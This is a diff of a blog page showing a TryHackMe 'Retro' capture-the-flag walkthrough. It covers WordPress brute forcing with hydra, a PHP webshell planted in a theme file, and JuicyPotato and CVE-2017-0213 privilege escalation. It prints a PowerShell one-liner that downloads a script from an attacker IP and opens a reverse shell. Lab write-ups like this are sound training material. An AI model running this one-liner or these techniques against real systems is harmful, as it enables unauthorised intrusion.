@@ -36,6 +36,10 @@
 
  
 
+
+  
+  
+  
  
 
 
@@ -49,11 +53,11 @@
 
 
 
-<title itemprop="name"></title>
-<meta property="og:title" content=ZgotmplZ />
-<meta name="twitter:title" content=ZgotmplZ />
-<meta itemprop="name" content=ZgotmplZ />
-<meta name="application-name" content=ZgotmplZ />
+<title itemprop="name"> - Retro Walkthrough</title>
+<meta property="og:title" content=&#32;-&#32;Retro&#32;Walkthrough />
+<meta name="twitter:title" content=&#32;-&#32;Retro&#32;Walkthrough />
+<meta itemprop="name" content=&#32;-&#32;Retro&#32;Walkthrough />
+<meta name="application-name" content=&#32;-&#32;Retro&#32;Walkthrough />
 <meta property="og:site_name" content="" />
 
 
@@ -63,11 +67,11 @@
 <meta name="twitter:description" content="" />
 
 
-<base href="https://hectorpadin1.github.io/tags/wordpress/" />
-<link rel="canonical" href="https://hectorpadin1.github.io/tags/wordpress/" itemprop="url" />
-<meta name="url" content="https://hectorpadin1.github.io/tags/wordpress/" />
-<meta name="twitter:url" content="https://hectorpadin1.github.io/tags/wordpress/" />
-<meta property="og:url" content="https://hectorpadin1.github.io/tags/wordpress/" />
+<base href="https://hectorpadin1.github.io/writeups/retro/" />
+<link rel="canonical" href="https://hectorpadin1.github.io/writeups/retro/" itemprop="url" />
+<meta name="url" content="https://hectorpadin1.github.io/writeups/retro/" />
+<meta name="twitter:url" content="https://hectorpadin1.github.io/writeups/retro/" />
+<meta property="og:url" content="https://hectorpadin1.github.io/writeups/retro/" />
 
 
 
@@ -77,7 +81,6 @@
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://hectorpadin1.github.io/sitemap.xml' />
-<link href="https://hectorpadin1.github.io/tags/wordpress/index.xml" rel="alternate" type="application/rss+xml" title="" />
 
 <meta name="robots" content="index,follow" />
 <meta name="googlebot" content="index,follow" />
@@ -104,14 +107,14 @@
     {
         "@context": "http://schema.org",
         "@type": "Article",
-        "headline": "WordPress",
+        "headline": "Retro Walkthrough",
         "author": {
             "@type": "Person",
             "name": ""
         },
         "datePublished": "2023-06-20",
         "description": "",
-        "wordCount":  0 ,
+        "wordCount":  916 ,
         "mainEntityOfPage": "True",
         "dateModified": "2023-06-20",
         "image": {
@@ -294,34 +297,165 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </aside>
 
             <main class="content container">
-                <h1 class="title">WordPress</h1>
-<ul class="entries">
+                <div class="post">
+  <div class="info">
+    <h1 class="post-title">
+        <a href="https://hectorpadin1.github.io/writeups/retro/">Retro Walkthrough</a>
+    </h1>
     
-        <h3 style="text-align: center;">2023</h3>
-        
-            <li>
-                <span class="title">
-                    <a href="/writeups/retro/">Retro Walkthrough</a>
-                </span>
-                <span class="published">
-                    <time class="pull-right post-list">June 20, 2023</time>
-                </span>
-            </li>
-        
-            <li>
-                <span class="title">
-                    <a href="/writeups/internal/">Internal Walkthrough</a>
-                </span>
-                <span class="published">
-                    <time class="pull-right post-list">June 20, 2023</time>
-                </span>
-            </li>
-        
+        <time datetime="2023-06-20T03:05:30&#43;0200" class="post-date">
+            June 20, 2023
+        </time>
     
-</ul>
+    
+    <ul class="tags">
+        
+        <li class="tag-TryHackme">
+            <a href="https://hectorpadin1.github.io/tags/tryhackme">TryHackme</a>
+        </li>
+        
+        <li class="tag-WordPress">
+            <a href="https://hectorpadin1.github.io/tags/wordpress">WordPress</a>
+        </li>
+        
+        <li class="tag-Brute Force">
+            <a href="https://hectorpadin1.github.io/tags/brute-force">Brute Force</a>
+        </li>
+        
+        <li class="tag-JuicyPotato">
+            <a href="https://hectorpadin1.github.io/tags/juicypotato">JuicyPotato</a>
+        </li>
+        
+        <li class="tag-CVE">
+            <a href="https://hectorpadin1.github.io/tags/cve">CVE</a>
+        </li>
+        
+    </ul>
+    
+    
+    
+    
+    
+    
+</div>
 
+  <p><img src="../../images/retro/retro-main2.png" alt=""></p>
+<h1 id="retro-tryhackmehttpstryhackmecom">Retro [<a href="https://tryhackme.com">TryHackme</a>]</h1>
+<ul>
+<li>URL: <a href="https://tryhackme.com/room/retro">https://tryhackme.com/room/retro</a></li>
+<li>Difficulty: <strong>Hard</strong>.</li>
+<li>OS: <strong>Windows</strong>.</li>
+<li>Subscription: <strong>Free</strong>.</li>
+<li>Creators: <a href="https://tryhackme.com/p/DarkStar7471">DarkStar7471</a></li>
+</ul>
+<hr>
+<h2 id="introduction">Introduction</h2>
+<p>To complete this room we are requested to find a hidden directory hidden directory in which the web site is located and two flags, called <code>user.txt</code> and <code>root.txt</code> which are located inside the machine. We are also told that there are <strong>two distinct paths that can be taken</strong> on <em>Retro</em>.</p>
+<hr>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="port-scanning">Port scanning</h3>
+<p>To carry out the port scanning a <em>Syn Stealth</em> scan is performed using <code>nmap</code> with the <code>-p-</code> option to scan all ports (-n and -Pn is to avoid name resolution and ping sweep respectively).</p>
+<p><img src="../../images/retro/1-nmap1.png" alt=""></p>
+<h3 id="service-scanning-and-enumeration">Service scanning and enumeration</h3>
+<p>Once the open ports are discovered, <code>nmap</code> is used to detect the version and service hosted on ports 80 and 3389.</p>
+<p><img src="../../images/retro/1-nmap.png" alt=""></p>
+<p>With these results we can see that we are dealing with a Windows machine with an <code>IIS 10.0</code> server and an <code>RDP</code> (Remote Desktop Protocol). Next, we used the <code>vuln</code> script to detect vulnerabilities in the exposed services, but no vulnerability was found.</p>
+<p><img src="../../images/retro/1-nmap3.png" alt=""></p>
+<p>This was followed by an enumeration of the web subdirectories using <code>gobuster</code>. We found a directory called <code>/retro</code>, wich contains the actual website.</p>
+<p><img src="../../images/retro/2-gobuster.png" alt=""></p>
+<p><img src="../../images/retro/3-web.png" alt=""></p>
+<p>A enumeration has also been carried out inside the <code>/retro</code> directory, in which we have found that we are dealing with a <code>Wordpress</code> site.</p>
+<p><img src="../../images/retro/4-gobuster2.png" alt=""></p>
+<hr>
+<h2 id="exploitation-of-vulnerabilities">Exploitation of vulnerabilities</h2>
+<h3 id="wordpress-enumeration">Wordpress enumeration</h3>
+<p>Inspecting the website, we can see that there is only one user who publishes on the website, named <code>wade</code>. If we try to access the administration panel with this user and any password, we are told that this user exists, but the password is wrong. This is a good starting point for a brute force attack.</p>
+<p><img src="../../images/retro/5-user.png" alt=""></p>
+<h3 id="brute-force-attack">Brute force attack</h3>
+<p>To carry out the attack, first we need to create a wordlist with the possible passwords. For this, we will use the <code>cewl</code> tool, which allows us to create a wordlist based on the words found on a website. In this case, we will use the default options, getting a dictionary of almost 850 words.</p>
+<p><img src="../../images/retro/6-passwords.png" alt=""></p>
+<p>Then, we use <code>hydra</code> to perform the brute force attack to the Wordpress login page. After a few minutes, we get the password for the <code>wade</code> user.</p>
+<p><img src="../../images/retro/7-bruteforce.png" alt=""></p>
+<h3 id="access-to-the-system">Access to the system</h3>
+<p>At this point, two possible ways to access the system were discovered:</p>
+<ul>
+<li>Use a Wordpress template to obtain an RCE, and access the system as <code>iusr</code> (built-in system account).</li>
+<li>Using the obtained credentials to access the machine via RPD as user <code>wade</code>.</li>
+</ul>
+<h4 id="obtaining-rce">Obtaining RCE</h4>
+<p>With the pair of credentials we can access the Wordpress administration panel and once inside, modify some template file to get a shell in the system. In this case the <code>404.php</code> file of the <em>twentynineteen</em> theme was chosen replacing the code with a <em>webshell</em> in PHP on which to execute commands.</p>
+<p><img src="../../images/retro/8-wp-cmd.png" alt=""></p>
+<p>Once the file has been modified, the <em>webshell</em> can be accessed from the URL <a href="http://retro.thm/retro/wp-content/themes/twentyseventeen/404.php">http://retro.thm/retro/wp-content/themes/twentyseventeen/404.php</a>. Now we have to remember that we are dealing with a Windows machine, so it is not as straightforward as getting a <em>shell</em> on Linux.</p>
+<p>In this case, i used the utility <code>Invoke-PowerShellTcp.ps1</code> from the <a href="https://github.com/samratashok/nishang/tree/master/Shells">Nishang</a> repository. We have to download this script in our machine, start a web server and then start our listener with <code>netcat</code> and <code>rlwrap</code> (try rlwrap, you really have to try it).</p>
+<p><img src="../../images/retro/9-getting-shell.png" alt=""></p>
+<p>After that, we can use the following <em>one-liner</em> to get a <em>shell</em> on the machine:</p>
+<p><img src="../../images/retro/10-get-shell.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://10.18.124.190:8000/Invoke-PowerShellTcp.ps1&#39;</span>);Invoke-PowerShellTcp -Reverse -IPAddress <span style="color:#ae81ff">10.18</span>.124.190 -Port <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p><img src="../../images/retro/11-got-shell.png" alt=""></p>
+<h4 id="accessing-via-rdp">Accessing via RDP</h4>
+<p>The other way to access the system is via RDP. To do this, we use the <code>xfreerdp</code> tool, which allows us to connect to a remote desktop using the RDP protocol. In this case, we will use the <code>/u</code> and <code>/p</code> options to specify the user and password respectively. Once inside, we can see the <code>user.txt</code> flag.</p>
+<p><img src="../../images/retro/rdp.png" alt=""></p>
+<hr>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>I found different ways to get root in Retro, deppending on which user you access the machine with.</p>
+<h3 id="accessing-as-iusr">Accessing as iusr</h3>
+<p>As we know, in this way we gained access to a non-administrative service account (iusr) and we want to get root. One of the first things to do when you access with this type of accounts is to check the privileges of the account and the OS version. This is because of the <code>Rotten Potato</code> exploit, which allow an attacker that gained access to a non-administrative service account to elevate privileges to “SYSTEM” if the account has for example the <code>SeImpersonatePrivilege</code> (in this <a href="https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/">link</a> you can find more information about the privileges that can be exploited).</p>
+<p>In this case we found that the <code>iusr</code> account has the <code>SeImpersonatePrivilege</code> privilege.</p>
+<p><img src="../../images/retro/12-privs.png" alt=""></p>
+<p>To abuse this vulnerability I used the compiled version of the exploit in the <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a> repository and a <em>reverse shell</em> created with <code>msfvenom</code>. Note that for this exploit to work, we have to found the <code>CLSID</code> of the machine, the default values for this field can be also found in the repo.</p>
+<p>So first, we have to download the exploit and create the payload with msfvenom. Then, we have to start a web server to transfer both files to the machine, start a listener and them execute the exploit. Once the exploit is executed, we get a <em>shell</em> as <code>SYSTEM</code>.</p>
+<p><img src="../../images/retro/13-exploit.png" alt=""></p>
+<p><img src="../../images/retro/14-pwned.png" alt=""></p>
+<h3 id="accessing-as-wade">Accessing as wade</h3>
+<p>After some research I found that the OS version (10.0.14393 N/A Build 14393) is vulnerable to the <a href="https://github.com/WindowsExploits/Exploits/tree/master">CVE-2017-0213</a>. In this case I used the compiled x64 version of the exploit, wich I sent to the victim using an HTTP server on the attacker machine. Then, I executed the exploit and got a <em>shell</em> as <code>SYSTEM</code>.</p>
+<p><img src="../../images/retro/16-systeminfo.png" alt=""></p>
+<p><img src="../../images/retro/17-pwned.png" alt=""></p>
+
+  <hr>
+<div class="footer">
+    
+	    
+	    
+            
+        
+    
+</div>
+
+  
+</div>
             </main>
             
+  <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#port-scanning">Port scanning</a></li>
+        <li><a href="#service-scanning-and-enumeration">Service scanning and enumeration</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation-of-vulnerabilities">Exploitation of vulnerabilities</a>
+      <ul>
+        <li><a href="#wordpress-enumeration">Wordpress enumeration</a></li>
+        <li><a href="#brute-force-attack">Brute force attack</a></li>
+        <li><a href="#access-to-the-system">Access to the system</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege escalation</a>
+      <ul>
+        <li><a href="#accessing-as-iusr">Accessing as iusr</a></li>
+        <li><a href="#accessing-as-wade">Accessing as wade</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+
         </div>
     </body>
 </html>
